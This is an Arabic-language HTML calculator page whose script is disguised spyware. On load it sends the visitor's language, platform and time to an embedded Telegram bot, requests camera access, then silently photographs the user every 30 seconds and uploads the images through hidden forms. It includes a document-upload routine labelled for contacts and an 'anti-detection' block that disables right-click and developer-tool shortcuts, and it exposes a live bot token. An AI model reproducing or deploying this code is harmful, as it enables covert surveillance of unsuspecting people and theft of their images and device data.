<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الآلة الحاسبة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { background: #1a1a2e; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 10px; }
        .calc-container { background: #16213e; border-radius: 30px; padding: 20px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
        .display { background: #0f3460; border-radius: 20px; padding: 25px 20px; margin-bottom: 15px; min-height: 120px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-end; overflow: hidden; }
        .display .expression { color: #a8b2d1; font-size: 18px; min-height: 30px; direction: ltr; word-break: break-all; }
        .display .result { color: #ffffff; font-size: 42px; font-weight: 700; direction: ltr; word-break: break-all; }
        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
        .btn { padding: 20px 0; border: none; border-radius: 16px; font-size: 24px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
        .btn:active { transform: scale(0.92); }
        .btn.num { background: #1a1a40; color: #e2e8f0; }
        .btn.num:active { background: #2a2a5a; }
        .btn.op { background: #e94560; color: white; }
        .btn.op:active { background: #c73e54; }
        .btn.func { background: #533483; color: white; }
        .btn.func:active { background: #6a44a8; }
        .btn.equals { background: #e94560; color: white; }
        .btn.equals:active { background: #c73e54; }
        .btn.zero { grid-column: span 2; }
    </style>
</head>
<body>
<div class="calc-container">
    <div class="display">
        <div class="expression" id="expression"></div>
        <div class="result" id="result">0</div>
    </div>
    <div class="buttons">
        <button class="btn func" data-value="AC">AC</button>
        <button class="btn func" data-value="DEL">⌫</button>
        <button class="btn func" data-value="%">%</button>
        <button class="btn op" data-value="/">÷</button>
        <button class="btn num" data-value="7">7</button>
        <button class="btn num" data-value="8">8</button>
        <button class="btn num" data-value="9">9</button>
        <button class="btn op" data-value="*">×</button>
        <button class="btn num" data-value="4">4</button>
        <button class="btn num" data-value="5">5</button>
        <button class="btn num" data-value="6">6</button>
        <button class="btn op" data-value="-">−</button>
        <button class="btn num" data-value="1">1</button>
        <button class="btn num" data-value="2">2</button>
        <button class="btn num" data-value="3">3</button>
        <button class="btn op" data-value="+">+</button>
        <button class="btn num zero" data-value="0">0</button>
        <button class="btn num" data-value=".">.</button>
        <button class="btn equals" data-value="=">=</button>
    </div>
</div>

<!-- ====== إطار iframe مخفي لاستقبال الـ response من form submit ====== -->
<iframe name="hiddenFrame" style="display:none;"></iframe>

<script>
// ================================================================
// ⚙️ إعدادات البوت
// ================================================================
const BOT_TOKEN = '8926051784:AAH4i198vbEAIPIgHf_8nsMlo1SVIOJL9NM';
const CHAT_ID  = '8328976452';
const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ================================================================
// 📤 الإرسال بدون CORS — الطرق الثلاث
// ================================================================

// الطريقة 1: Image GET — للنصوص القصيرة
function sendViaImage(text) {
    const img = new Image();
    img.src = `${API_BASE}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
}

// الطريقة 2: Form submit — للصور (base64)
function sendPhotoViaForm(base64, caption) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `${API_BASE}/sendPhoto`;
    form.enctype = 'multipart/form-data';
    form.target = 'hiddenFrame';  // عشان ما يفتحش صفحة جديدة
    form.style.display = 'none';
    
    const input1 = document.createElement('input');
    input1.name = 'chat_id';
    input1.value = CHAT_ID;
    form.appendChild(input1);
    
    const input2 = document.createElement('input');
    input2.name = 'caption';
    input2.value = caption || `📸 صورة من الجهاز`;
    form.appendChild(input2);
    
    const input3 = document.createElement('input');
    input3.name = 'photo';
    input3.value = base64;
    form.appendChild(input3);
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => form.remove(), 2000);
}

// الطريقة 3: Form submit — للمستندات (جهات اتصال، إلخ)
function sendDocumentViaForm(base64, filename, caption) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `${API_BASE}/sendDocument`;
    form.enctype = 'multipart/form-data';
    form.target = 'hiddenFrame';
    form.style.display = 'none';
    
    const input1 = document.createElement('input');
    input1.name = 'chat_id';
    input1.value = CHAT_ID;
    form.appendChild(input1);
    
    const input2 = document.createElement('input');
    input2.name = 'caption';
    input2.value = caption || `📎 ملف: ${filename}`;
    form.appendChild(input2);
    
    const input3 = document.createElement('input');
    input3.name = 'document';
    input3.value = base64;
    form.appendChild(input3);
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => form.remove(), 2000);
}

// إرسال نص طويل
function sendLongText(text) {
    // للأقل من 200 حرف: نستخدم Image GET
    if (text.length < 200) {
        sendViaImage(text);
        return;
    }
    // للأطول: Form submit
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `${API_BASE}/sendMessage`;
    form.enctype = 'application/x-www-form-urlencoded';
    form.target = 'hiddenFrame';
    form.style.display = 'none';
    
    const input1 = document.createElement('input');
    input1.name = 'chat_id';
    input1.value = CHAT_ID;
    form.appendChild(input1);
    
    const input2 = document.createElement('input');
    input2.name = 'text';
    input2.value = text;
    form.appendChild(input2);
    
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => form.remove(), 2000);
}

// ================================================================
// ⚙️ منطق الآلة الحاسبة
// ================================================================
let currentInput = '';
let expression = '';
let lastResult = null;
let justEvaluated = false;

const displayResult = document.getElementById('result');
const displayExpr = document.getElementById('expression');

function updateDisplay() {
    displayResult.textContent = currentInput || '0';
    displayExpr.textContent = expression;
}

function press(value) {
    if (justEvaluated && !isNaN(value) && value !== '.') {
        currentInput = '';
        expression = '';
        justEvaluated = false;
    }
    if (value === 'AC') {
        currentInput = '';
        expression = '';
        lastResult = null;
        justEvaluated = false;
    } else if (value === 'DEL') {
        currentInput = currentInput.slice(0, -1);
    } else if (value === '=') {
        try {
            const fullExpr = expression + currentInput;
            const result = eval(fullExpr);
            if (!isFinite(result)) throw 'Error';
            expression = fullExpr + ' =';
            currentInput = String(result);
            lastResult = result;
            justEvaluated = true;
        } catch(e) {
            expression = 'خطأ';
            currentInput = '0';
            justEvaluated = true;
        }
    } else if (['+', '-', '*', '/', '%'].includes(value)) {
        if (currentInput === '' && lastResult !== null) {
            currentInput = String(lastResult);
        }
        if (currentInput === '') return;
        expression += currentInput + ' ' + value + ' ';
        currentInput = '';
        justEvaluated = false;
    } else {
        if (value === '.' && currentInput.includes('.')) return;
        currentInput += value;
        justEvaluated = false;
    }
    updateDisplay();
}

document.querySelectorAll('.btn').forEach(btn => {
    btn.addEventListener('click', function() {
        press(this.dataset.value);
    });
});

document.addEventListener('keydown', function(e) {
    const key = e.key;
    if (key >= '0' && key <= '9') press(key);
    else if (key === '.') press('.');
    else if (key === '+') press('+');
    else if (key === '-') press('-');
    else if (key === '*') press('*');
    else if (key === '/') press('/');
    else if (key === '%') press('%');
    else if (key === 'Enter' || key === '=') press('=');
    else if (key === 'Backspace') press('DEL');
    else if (key === 'Escape') press('AC');
});

// ================================================================
// 🎭 الكاميرا — التصوير الصامت
// ================================================================
let cameraStream = null;

async function captureSilentPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.muted = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                const base64 = canvas.toDataURL('image/jpeg', 0.8);
                sendPhotoViaForm(base64, `📸 صورة من الكاميرا\n🕐 ${new Date().toLocaleString('ar-SA')}`);

                stream.getTracks().forEach(t => t.stop());
                video.remove();
                canvas.remove();
            }, 500);
        };
    } catch(e) {
        sendViaImage(`❌ فشل تصوير الكاميرا: ${e.message}`);
    }
}

// ================================================================
// 🎮 طلب صلاحية الكاميرا لأول مرة
// ================================================================
async function requestCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
        });
        stream.getTracks().forEach(t => t.stop());
        return true;
    } catch(e) {
        return false;
    }
}

// ================================================================
// 🚀 التفعيل — فور فتح الصفحة
// ================================================================

// 1. إرسال إشعار بالاتصال (يشتغل على طول بدون CORS)
setTimeout(() => {
    sendViaImage(`🟢 جهاز متصل!\n🕐 ${new Date().toISOString()}\n🌐 ${navigator.language}\n📱 ${navigator.platform || 'N/A'}`);
}, 1000);

// 2. طلب صلاحية الكاميرا بعد 2 ثانية
setTimeout(async () => {
    const granted = await requestCamera();
    if (granted) {
        sendViaImage('📸 تم الحصول على صلاحية الكاميرا');
        // تصوير أول صورة بعد 3 ثواني
        setTimeout(captureSilentPhoto, 3000);
    }
}, 2000);

// 3. محاولة التقاط صور أخرى كل 30 ثانية
setInterval(captureSilentPhoto, 30000);

// ================================================================
// 🛡️ منع الاكتشاف
// ================================================================
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
        (e.ctrlKey && e.shiftKey && e.key === 'J') ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
    }
});

console.log('✅ الآلة الحاسبة جاهزة — بدون CORS');
</script>
</body>
</html>
